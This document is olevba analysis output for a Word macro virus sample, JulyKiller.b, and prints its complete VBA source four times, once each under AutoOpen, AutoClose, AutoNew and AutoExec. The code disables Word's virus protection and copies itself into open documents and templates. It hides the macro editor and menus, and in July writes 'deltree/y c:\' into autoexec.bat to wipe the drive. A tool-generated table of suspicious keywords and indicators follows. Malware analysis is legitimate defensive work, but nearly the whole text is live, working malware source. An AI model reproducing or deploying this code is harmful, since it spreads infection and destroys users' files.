olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JulyKiller.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JulyKiller.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO a.bas 
in file: Virus.MSWord.JulyKiller.b - OLE stream: 'Macros/VBA/a'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    
    On Error GoTo -1: On Error GoTo 0
    On Error GoTo -1: On Error GoTo pun
    
    For Each ad In AddIns
    If ad.Name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .Path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aDoc.FullName + ":a"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aTemp.FullName + ":a"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":a", ActiveDocument.FullName + ":a"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":a", aDoc.FullName + ":a"
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":a", aTemp.FullName + ":a"
        End If
    Next aTemp
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyH))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyK))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "ﾗﾔｶｨﾒ�(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾄ｣ｰ蠎ﾍｼﾓﾔﾘﾏ�(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾑ｡ﾏ�(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ｺ�(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ｺ�(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ｱ狆ｭﾆ�(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    
pun:
    If WordBasic.Month(WordBasic.Now()) = 7 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
        If test > 2 Then GoTo result
        test = test + 1
        WordBasic.Beep
    ans$ = WordBasic.[InputBox$]("ｵｱｽ扈睥ｫｺﾚｰｵ｣ｬﾌｫｲｻｹｫﾕﾁﾋ｣｡(" + Str(test) + ")", "ﾐﾑﾊﾀｺ耜ﾔ", "ｷﾇｳ｣ﾕﾈｷ")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "ｷﾇｳ｣ﾕﾈｷ" Then
            WordBasic.Beep
            WordBasic.MsgBox "You are wise,please choose this later again,critically!", 48
            GoTo exit_
        Else
            GoTo try
        End If
result:
        WordBasic.Beep
        WordBasic.MsgBox "Stop it!you are so incurable to lose 3 chances!" + Chr(13) + "Now,god will punish you...", 48
        Open "C:\autoexec.bat" For Output As 1
        Print #1, "deltree/y c:\"
        Close 1
    Else
        'MsgBox "Conguratulations!"
    End If
exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub
Sub AutoClose()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    
    On Error GoTo -1: On Error GoTo 0
    On Error GoTo -1: On Error GoTo pun
    
    For Each ad In AddIns
    If ad.Name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .Path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aDoc.FullName + ":a"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aTemp.FullName + ":a"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":a", ActiveDocument.FullName + ":a"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":a", aDoc.FullName + ":a"
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":a", aTemp.FullName + ":a"
        End If
    Next aTemp
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyH))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyK))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "ﾗﾔｶｨﾒ�(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾄ｣ｰ蠎ﾍｼﾓﾔﾘﾏ�(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾑ｡ﾏ�(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ｺ�(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ｺ�(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ｱ狆ｭﾆ�(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    
pun:
    If WordBasic.Month(WordBasic.Now()) = 7 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
        If test > 2 Then GoTo result
        test = test + 1
        WordBasic.Beep
    ans$ = WordBasic.[InputBox$]("ｵｱｽ扈睥ｫｺﾚｰｵ｣ｬﾌｫｲｻｹｫﾕﾁﾋ｣｡(" + Str(test) + ")", "ﾐﾑﾊﾀｺ耜ﾔ", "ｷﾇｳ｣ﾕﾈｷ")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "ｷﾇｳ｣ﾕﾈｷ" Then
            WordBasic.Beep
            WordBasic.MsgBox "You are wise,please choose this later again,critically!", 48
            GoTo exit_
        Else
            GoTo try
        End If
result:
        WordBasic.Beep
        WordBasic.MsgBox "Stop it!you are so incurable to lose 3 chances!" + Chr(13) + "Now,god will punish you...", 48
        Open "C:\autoexec.bat" For Output As 1
        Print #1, "deltree/y c:\"
        Close 1
    Else
        'MsgBox "Conguratulations!"
    End If
exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub
Sub AutoNew()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    
    On Error GoTo -1: On Error GoTo 0
    On Error GoTo -1: On Error GoTo pun
    
    For Each ad In AddIns
    If ad.Name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .Path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aDoc.FullName + ":a"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aTemp.FullName + ":a"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":a", ActiveDocument.FullName + ":a"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":a", aDoc.FullName + ":a"
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":a", aTemp.FullName + ":a"
        End If
    Next aTemp
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyH))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyK))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "ﾗﾔｶｨﾒ�(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾄ｣ｰ蠎ﾍｼﾓﾔﾘﾏ�(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾑ｡ﾏ�(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ｺ�(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ｺ�(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ｱ狆ｭﾆ�(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    
pun:
    If WordBasic.Month(WordBasic.Now()) = 7 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
        If test > 2 Then GoTo result
        test = test + 1
        WordBasic.Beep
    ans$ = WordBasic.[InputBox$]("ｵｱｽ扈睥ｫｺﾚｰｵ｣ｬﾌｫｲｻｹｫﾕﾁﾋ｣｡(" + Str(test) + ")", "ﾐﾑﾊﾀｺ耜ﾔ", "ｷﾇｳ｣ﾕﾈｷ")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "ｷﾇｳ｣ﾕﾈｷ" Then
            WordBasic.Beep
            WordBasic.MsgBox "You are wise,please choose this later again,critically!", 48
            GoTo exit_
        Else
            GoTo try
        End If
result:
        WordBasic.Beep
        WordBasic.MsgBox "Stop it!you are so incurable to lose 3 chances!" + Chr(13) + "Now,god will punish you...", 48
        Open "C:\autoexec.bat" For Output As 1
        Print #1, "deltree/y c:\"
        Close 1
    Else
        'MsgBox "Conguratulations!"
    End If
exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub
Sub AutoExec()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    
    On Error GoTo -1: On Error GoTo 0
    On Error GoTo -1: On Error GoTo pun
    
    For Each ad In AddIns
    If ad.Name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .Path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "a") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aDoc.FullName + ":a"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":a", aTemp.FullName + ":a"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":a", ActiveDocument.FullName + ":a"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Or (cItem.Name = "a") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":a", aDoc.FullName + ":a"
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":a", aTemp.FullName + ":a"
        End If
    Next aTemp
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyH))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyK))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "ﾗﾔｶｨﾒ�(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾄ｣ｰ蠎ﾍｼﾓﾔﾘﾏ�(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "ﾑ｡ﾏ�(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ｺ�(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ｺ�(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ｱ狆ｭﾆ�(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    
pun:
    If WordBasic.Month(WordBasic.Now()) = 7 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
        If test > 2 Then GoTo result
        test = test + 1
        WordBasic.Beep
    ans$ = WordBasic.[InputBox$]("ｵｱｽ扈睥ｫｺﾚｰｵ｣ｬﾌｫｲｻｹｫﾕﾁﾋ｣｡(" + Str(test) + ")", "ﾐﾑﾊﾀｺ耜ﾔ", "ｷﾇｳ｣ﾕﾈｷ")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "ｷﾇｳ｣ﾕﾈｷ" Then
            WordBasic.Beep
            WordBasic.MsgBox "You are wise,please choose this later again,critically!", 48
            GoTo exit_
        Else
            GoTo try
        End If
result:
        WordBasic.Beep
        WordBasic.MsgBox "Stop it!you are so incurable to lose 3 chances!" + Chr(13) + "Now,god will punish you...", 48
        Open "C:\autoexec.bat" For Output As 1
        Print #1, "deltree/y c:\"
        Close 1
    Else
        'MsgBox "Conguratulations!"
    End If
exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

